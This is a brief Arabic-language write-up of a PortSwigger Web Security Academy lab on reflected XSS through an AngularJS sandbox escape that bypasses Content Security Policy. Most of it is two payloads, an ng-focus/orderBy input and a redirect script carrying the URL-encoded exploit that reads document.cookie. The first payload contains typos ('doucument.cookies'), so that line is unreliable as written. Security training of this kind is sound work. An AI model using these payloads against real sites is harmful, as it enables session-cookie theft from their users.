# Lab : Reflected XSS with AngularJS sandbox escape and CSP

[https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)

- الفكره من الLab ده اهرب من sandbox والCSP الي هو contest Security Policy الي الموقع شغال بيه واعمل alert للcookies

```bash
1. هنسنخدم الpayload ده 

2. <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)(doucument.cookies)'">

3. <script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```
